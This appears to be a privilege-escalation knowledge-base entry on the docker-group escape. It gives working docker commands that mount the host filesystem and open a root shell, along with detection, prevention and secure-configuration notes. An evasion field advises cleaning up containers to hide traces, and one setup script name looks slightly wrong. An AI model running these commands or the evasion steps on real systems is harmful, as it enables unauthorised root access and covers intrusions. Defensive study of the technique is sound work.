examples.label: Mount host / into a container and chroot to root
examples.command: docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

examples.label: Mount just /root to read root's files
One-shot flag read via a throwaway container
Interactive host-root shell
examples.command:
docker pull ubuntu
docker run --rm -it -v /:/mnt ubuntu /bin/bash   # then: cat /mnt/root/flag.txt

notes: Membership in the docker group is root-equivalent: mount host / into a container and chroot in. The throwaway --rm one-liners read root files without leaving a container behind.

recommended.note: Same idea via LXD if docker isn't available.
Same escape from inside a container via the socket.

name: Privileged Groups - Docker Group Escape
description: The docker group is root-equivalent: mount the host root filesystem into a container and chroot into it, or just read root-only files. One command to a host root shell.

defense.why_it_works: Being in the 'docker' group grants access to the Docker socket. This is equivalent to unrestricted root access: 'docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash' mounts the entire host filesystem and opens a root shell in a container with full host access, bypassing all filesystem permissions.
defense.prerequisites: Attacker's user is a member of the 'docker' group. Docker daemon running. Internet access or a local image available.
defense.impact: Root shell on the host via a privileged container. Full read/write access to the entire host filesystem. Persistent backdoor installation.
defense.detection: Docker commands issued by docker-group members. Container started with host root mount. Docker audit log: new container with / volume from non-admin user. EDR: chroot executed inside container.
defense.artifacts: Docker daemon log (container with host / mount) | Auditd: docker run by non-root group member | EDR: host filesystem access from container process
defense.prevention: Treat docker group membership as root equivalent. Remove all unnecessary users from docker group. Use rootless Docker instead. For CI/CD, use Podman with user namespaces instead of root-mode Docker.
defense.misconfiguration: Developer or service account added to 'docker' group for convenience, effectively granting root access to the system.
defense.vulnerable_config:
# User in docker group (equivalent to root)
id
# uid=1000(dev) groups=...,999(docker)

# Trivial root: 
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
defense.secure_config:
# Remove from docker group
gpasswd -d dev docker

# Use rootless Docker for developers
dockerless-setuptool.sh install

# If docker group needed, audit and limit to specific hosts/VMs only
# Never add docker group members on production systems
defense.evasion: Use a single container/mount escape that reads what you need and exits; remove images/containers you created (docker rmi / lxc delete); avoid leaving a privileged container running.
